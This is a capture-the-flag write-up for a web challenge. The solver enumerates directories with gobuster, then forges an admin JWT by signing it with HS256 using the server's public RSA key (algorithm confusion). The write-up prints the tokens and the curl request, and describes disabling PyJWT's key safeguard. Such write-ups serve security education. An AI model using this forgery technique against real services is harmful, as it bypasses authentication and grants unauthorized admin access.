# Challenge description

Bruh, Tanjiro messed up BIG TIME. 😭 He hid Goku’s summoning scroll somewhere on this cursed website, and now it’s all broken. 💀 If we don’t find it fast, Goku’s never showing up, and we’re all doomed. No cap, this might be the hardest quest yet. Think you got what it takes? 👀🔥 Can you wield your skills like Tanjiro’s blade and break through the encrypted defenses?

https://tan-je-ro.onrender.com/ 

# Soluce 

I started by looking at the possible directories on the website using gobuster.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u https://tan-je-ro.onrender.com/ -w /usr/share/wordlists/dirb/common.txt -k

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://tan-je-ro.onrender.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 412]
/ADMIN                (Status: 200) [Size: 412]
/Admin                (Status: 200) [Size: 412]
/login                (Status: 200) [Size: 861]
/Login                (Status: 200) [Size: 861]
/public               (Status: 200) [Size: 875]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

When we go to the /admin directory, it say that we need to have a token to access it.

When we go to the /login directory, it gives us a JWT token exemple for a normal user.

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkxMjc2NX0.irNHg8Yvzh_KWuQE9OgZr3HdsuOfr-SOhqGlTVEhwqGReCUMSFkVdiF4aaffGhC2r8czRFG2a08QCORU_EY1o6IA_EEKRJsLnQzLV5nS1HKDDMAdVW8-q6Kvu6YXn3lJbaq5i0vPjPdde1UjU59GBkm3FedK6x-kPHkxVd-jNcnRi2rUzcB4ebqDsJF_Fw2xzGwCBNQTyGRHCWzK6rs7bYO_l5XPsXMym8Ssjt6hTBAhd33goJ0Pm7fr9VfaAzEPc1kZP9HCtLLURRc8MwL2PAvHXPjc4X9YW4b59ufXhwRzxQ9o7pZqc-04F2s8H8tb2h6I5CSmUD1_NULd2D7OeA
```

And when we go to the /public directory, it gives us the public key to verify the JWT token.

```
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAwcMU3Y6CQyvA87vJRKZomubiceep9YlNdp6y95ICIZ3y7jV3oZyt
b1zfwFJ1p/pdTd7ckOOQVsP6/Y7g6gLa9S8YZmKzy7jU6EnV2XPnXTF287hXasup
OzLd4iAzRw12r9pIQ/Fjum8pQ2LzWEaAmuHfkm1o3C9i8ZsbfvZIw/tAB/qEfh34
dGoVvPsJawF44oEFkAQYlS40FmM1EkNzNmNPtKUXlRrr0be0PTCshUbX7VpGC0b1
9JKb/vB+KGye6yUjLwHKKUHZedHQFMMV9OayOwWSnP9J+9Tq77qyNSeBe6vy6uD1
XPm0mfmUYLJZKy0XqjHHxOB9DjKaecmMoQIDAQAB
-----END RSA PUBLIC KEY-----
```

If we put the JWT on [jwt.io](https://jwt.io/), we can see that:

```
{
  "alg": "RS256",
  "typ": "JWT"

}
{
  "admin": false,
  "name": "Guest",
  "iat": 1740912765
}
```

We can see that the token is signed with the RS256 algorithm. We will use the public key as a secret to sign our own token with the admin field set to true in HS256 algorithm.

The code to do this is [here](tan_je_ro.py).

Be careful, python's JWT library has a security so that it is not possible to use a public key to sign a JWT. So you have to modify 'algorithms.py' of the library, the function 'prepare_key' to remove the security.

The code gives us this token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwiaWF0IjoxNzQwOTU3NDc3fQ.PPNAmTayT5iC7K8MOVsOPyuajlcevzhmS5cxoyfTu0U
```

We can call the /admin directory with this token and we get the flag.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl "https://tan-je-ro.onrender.com/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwiaWF0IjoxNzQwOTU3NDc3fQ.PPNAmTayT5iC7K8MOVsOPyuajlcevzhmS5cxoyfTu0U"
```
